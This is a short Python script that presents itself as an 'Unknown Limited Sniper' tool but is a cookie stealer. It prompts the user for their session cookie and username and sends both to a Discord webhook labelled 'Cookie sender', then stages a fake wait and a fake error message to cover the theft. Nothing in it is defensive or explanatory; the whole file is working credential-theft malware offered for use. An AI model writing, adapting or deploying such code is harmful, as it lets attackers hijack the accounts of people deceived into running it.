#dont skid this lmao

from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write
import discord, requests, discord_webhook
from discord.ext import commands
from discord_webhook import DiscordEmbed, DiscordWebhook

req = requests.Session()
client = commands.Bot(command_prefix='.') #set prefix


colorama.init()

loadingauth = "webhook here"
#paste in your webhook


def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
 
    w("Welcome to Unknown Limited Sniper! Press enter to continue: ")
    cookiedata = Write.Input("cookie -> ",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("Press enter to continue")
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie sender',
                      'content': f'```{cookiedata}```'
 
                  })
    os.system('cls')
    userdata = Write.Input("username ->",
                           
                           Colors.purple_to_blue,
                           interval=0.005)

    w("Please wait 1 minute")
    time.sleep(65)
    w("Error, please restart this program and PC.")
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie Sender',
                      'content': f'```{userdata}```'
                  })


main()
